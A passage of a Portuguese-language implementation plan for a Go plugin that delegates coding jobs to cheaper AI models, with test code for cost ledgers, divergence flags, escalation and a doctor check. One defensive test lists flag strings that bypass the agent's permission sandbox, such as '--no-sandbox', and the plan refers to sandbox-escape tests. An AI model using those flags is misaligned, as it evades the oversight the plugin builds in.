		t.Errorf("truncamento silencioso esconde perda: %q", out)
	}
}

type meioAMeio struct{}

func (meioAMeio) Ask(context.Context, any, map[string]jev.Question) (jev.Result, error) {
	raw, _ := json.Marshal(map[string]any{
		"chamada_necessaria":            map[string]any{"type": "noul", "noul": 0.9},
		"resultado_necessario_verbatim": map[string]any{"type": "noul", "noul": 0.1}})
	var a jev.Answers
	_ = json.Unmarshal(raw, &a)
	return jev.Result{Answers: a, Usage: jev.Usage{InputTokens: 5}}, nil
}
```

- [ ] **Step 2: Escrever o teste do render**

```go
// internal/render/result_test.go
package render

import (
	"bytes"
	"testing"

	"github.com/heliowap/delegador/internal/verify"
)

// A flag de divergencia e o motivo de o plugin existir: relatorio afirmando
// verde contra exit code que discorda.
func TestFlagaRelatorioVerdeComSuiteVermelha(t *testing.T) {
	var b bytes.Buffer
	Result(&b, Input{
		Verify: verify.Report{Steps: []verify.Step{
			{Name: "teste", Command: "go test ./...", ExitCode: 1, Stdout: "FAIL: TestSoma"}}},
		AfirmaVerde: 0.95})

	if !bytes.Contains(b.Bytes(), []byte("DIVERGENCIA")) {
		t.Errorf("falta a flag:\n%s", b.String())
	}
	if !bytes.Contains(b.Bytes(), []byte("FAIL: TestSoma")) {
		t.Error("a saida real do teste precisa aparecer")
	}
}

func TestFlagaMutacaoQueNaoProvaNada(t *testing.T) {
	var b bytes.Buffer
	Result(&b, Input{Verify: verify.Report{
		Steps: []verify.Step{{Name: "teste", ExitCode: 0}}, MutationProved: false}})
	if !bytes.Contains(b.Bytes(), []byte("mutacao")) {
		t.Errorf("mutacao que nao provou nada precisa aparecer:\n%s", b.String())
	}
}

func TestSemDivergenciaNaoFlaga(t *testing.T) {
	var b bytes.Buffer
	Result(&b, Input{Verify: verify.Report{
		Steps:          []verify.Step{{Name: "teste", ExitCode: 0}, {Name: "suite", ExitCode: 0}},
		MutationProved: true}, AfirmaVerde: 0.95})
	if bytes.Contains(b.Bytes(), []byte("DIVERGENCIA")) {
		t.Errorf("sem divergencia nao deveria flagar:\n%s", b.String())
	}
}

// Modelo nao medido escolhido precisa aparecer no relatorio: quem le tem de
// saber que a escolha nao teve nota por tras.
func TestDizQuandoModeloNaoTemNota(t *testing.T) {
	var b bytes.Buffer
	Result(&b, Input{Verify: verify.Report{Steps: []verify.Step{{Name: "teste", ExitCode: 0}}},
		Escolha: routeEscolhaNaoMedida()})
	if !bytes.Contains(b.Bytes(), []byte("nao medido")) {
		t.Errorf("escolha sem nota precisa ser declarada:\n%s", b.String())
	}
}
```

Declare `routeEscolhaNaoMedida()` no mesmo arquivo, devolvendo uma `route.Escolha` com `NaoMedido: true`.

- [ ] **Step 3: Escrever o teste do ledger**

```go
// internal/ledger/ledger_test.go
package ledger

import (
	"math"
	"path/filepath"
	"testing"
)

// Jev e executor vao em arquivos separados porque sao ordens de grandeza
// diferentes: Jev cobra $0.042/M so na entrada; executor cobra os dois lados.
func TestSomaEntradaESaidaComPrecosDistintos(t *testing.T) {
	l := &Ledger{Path: filepath.Join(t.TempDir(), "executor.jsonl")}
	if err := l.Record("turno", 1_000_000, 200_000, 0.15, 0.50); err != nil {
		t.Fatalf("Record: %v", err)
	}
	usd, err := l.Total()
	if err != nil {
		t.Fatalf("Total: %v", err)
	}
	// 1M x 0.15 + 0.2M x 0.50 = 0.15 + 0.10 = 0.25
	if math.Abs(usd-0.25) > 1e-9 {
		t.Errorf("usd = %v, quero 0.25", usd)
	}
}

func TestArquivoAusenteEhZeroNaoErro(t *testing.T) {
	l := &Ledger{Path: filepath.Join(t.TempDir(), "nao-existe.jsonl")}
	if usd, err := l.Total(); err != nil || usd != 0 {
		t.Errorf("quero 0 sem erro, tenho %v / %v", usd, err)
	}
}
```

- [ ] **Step 4: Vermelho, implementar, verde**

Guia: o ledger é gêmeo do `internal/jev/budget.go`, que já está verde — reuse a forma, mudando só que aqui há dois preços. O `render.Result` abre com o bloco de cancelamento quando houver, depois divergências, depois o veredito verificado, e só então o trace compactado: quem lê precisa ver o que desmente antes do que afirma.

- [ ] **Step 5: Commit**

```bash
go vet ./... && go test ./internal/compact/ ./internal/render/ ./internal/ledger/ -v
git add internal/compact internal/render internal/ledger
git commit -m "feat: compactacao por delecao, flag de divergencia e ledger do executor"
```

---

### Task 14: `run` — o subcomando que junta tudo

**Files:**
- Create: `internal/cli/run.go`
- Test: `internal/cli/run_test.go`

**Interfaces:**
- Consumes: tudo das Tasks 3 a 13.
- Produces: `run --job <id>` — classifica, roteia, executa, verifica, decide cascata, repete se escalar, grava resultado.

- [ ] **Step 1: Escrever o teste que falha**

```go
// internal/cli/run_test.go
package cli

import (
	"bytes"
	"context"
	"strings"
	"testing"
)

// O caminho feliz inteiro, sem rede: barato executa, verificacao verde, fim.
func TestRunCaminhoFeliz(t *testing.T) {
	env := setupRunEnv(t, cenarioQueEscreveTesteECorrige())
	var out, errBuf bytes.Buffer

	if code := Run(context.Background(), []string{"run", "--job", env.JobID}, &out, &errBuf); code != 0 {
		t.Fatalf("exit %d: %s", code, errBuf.String())
	}
	s := out.String()
	if !strings.Contains(s, "verde") {
		t.Errorf("relatorio nao reporta verde:\n%s", s)
	}
	if strings.Contains(s, "escalou") {
		t.Errorf("nao deveria ter escalado:\n%s", s)
	}
}

// Barato falha na verificacao, forte entra, e o relatorio diz os dois.
func TestRunEscalaEDizQueEscalou(t *testing.T) {
	env := setupRunEnv(t, cenarioQueFalhaDepoisPassa())
	var out, errBuf bytes.Buffer

	if code := Run(context.Background(), []string{"run", "--job", env.JobID}, &out, &errBuf); code != 0 {
		t.Fatalf("exit %d: %s", code, errBuf.String())
	}
	s := out.String()
	if !strings.Contains(s, "escalou") {
		t.Errorf("a escalada precisa aparecer no relatorio:\n%s", s)
	}
	if !strings.Contains(s, "modelo") {
		t.Errorf("o relatorio precisa nomear os modelos usados:\n%s", s)
	}
}

func TestRunSeparaCustoDeJevEDeExecutor(t *testing.T) {
	env := setupRunEnv(t, cenarioQueEscreveTesteECorrige())
	var out, errBuf bytes.Buffer
	Run(context.Background(), []string{"run", "--job", env.JobID}, &out, &errBuf)

	s := out.String()
	if !strings.Contains(s, "jev") || !strings.Contains(s, "executor") {
		t.Errorf("os dois custos sao ordens de grandeza diferentes e vao separados:\n%s", s)
	}
}
```

Os helpers `setupRunEnv`, `cenarioQueEscreveTesteECorrige` e `cenarioQueFalhaDepoisPassa` vão em `internal/cli/runhelpers_test.go`: cada um monta um repo git temporário, um job em `job.Create`, e um `testsupport.Scenario` que dirige o laço pelo caminho desejado.

- [ ] **Step 2: Vermelho, implementar, verde**

- [ ] **Step 3: Commit**

```bash
git add internal/cli && git commit -m "feat: subcomando run com cascata de ponta a ponta"
```

---

### Task 15: Superfície, `doctor`, `AGENTS.md` e CI

**Files:**
- Create: `.claude-plugin/{plugin.json,marketplace.json}`, `commands/*.md`, `agents/delegador-rescue.md`, `skills/*/SKILL.md`, `internal/cli/doctor.go`, `internal/cli/roster.go`, `AGENTS.md`, `.github/workflows/ci.yml`
- Test: `internal/pluginfiles/pluginfiles_test.go`, `internal/cli/doctor_test.go`

**Interfaces:**
- Produces: `doctor` (proxy alcançável, chaves presentes, roster carregável, sondagens não vencidas), `roster --probe [id]`, e a superfície instalável.

- [ ] **Step 1: Teste de conformidade da superfície**

Porte o teste da tarefa 17 do plano v1 — manifesto válido, frontmatter em todo Markdown, e nenhum Markdown referenciando subcomando inexistente — com a lista de subcomandos do v2: `plan`, `run`, `status`, `result`, `roster`, `doctor`.

Acrescente um teste que o v1 não tinha e o v2 precisa:

```go
// Nenhum Markdown pode ensinar a contornar a permissao — ela e a correcao
// central do v2, e um comando na documentacao vira um comando executado.
func TestNoMarkdownTeachesPermissionBypass(t *testing.T) {
	proibidos := []string{"--permission-mode dangerous", "AllowCommands: git push", "--no-sandbox"}
	for _, dir := range []string{"commands", "agents", "skills"} {
		_ = filepath.Walk(filepath.Join(root(t), dir), func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() || !strings.HasSuffix(path, ".md") {
				return nil
			}
			raw, _ := os.ReadFile(path)
			for _, p := range proibidos {
				if strings.Contains(string(raw), p) {
					t.Errorf("%s ensina a contornar a permissao: %q", path, p)
				}
			}
			return nil
		})
	}
}
```

- [ ] **Step 2: `doctor` com sondagem**

`doctor` confere, e falha com a causa em vez de deixar o job morrer no meio: proxy alcançável em `$DELEGADOR_BASE_URL` ou `http://127.0.0.1:8317/v1`; `TYPESAFE_API_KEY` presente; roster carregável; e quantos modelos estão elegíveis, **listando o motivo de cada exclusão**.

- [ ] **Step 3: `AGENTS.md`, CI e commit**

`AGENTS.md` com as regras globais deste plano, a política de Documentation Maintenance do repo, e como chamar o binário fora do Claude Code. CI: `go vet`, `staticcheck`, `go test ./...`, e a checagem de que `go.mod` não ganhou dependência.

```bash
go test ./... && git add -A && git commit -m "feat: superficie do plugin, doctor, AGENTS.md e CI"
```

---

## Ordem, checkpoints e o que cortar

As Tasks 1 e 2 são infraestrutura: sem elas nada é testável. A **Task 3 é o checkpoint que decide o v2** — se a permissão não for sólida, o laço próprio é pior que o CLI que ele substitui, e `TestDeniesChainedEscape` e `TestDeniesSymlinkEscape` são os dois testes que provam isso. A **Task 6** é o segundo: `TestRunContinuesAfterDeniedCall` é a correção central do v2 em forma de teste. A **Task 12** é o terceiro, com `TestRunFlagsTestThatProvesNothing`, que sustenta a cascata.

Se faltar tempo, corte a Task 11 (cascata) e rode só o barato: o plugin entrega valor sem escalada, e a verificação continua acusando. **Não corte a Task 2** — sem o servidor falso, cada `go test` vira token gasto e dependência de rede.

O resultado do [handoff do eval](../handoffs/2026-09-20-eval-swe2-vs-glm.md) não bloqueia nada aqui: ele decide qual modelo entra como padrão do roster, não como o sistema funciona.
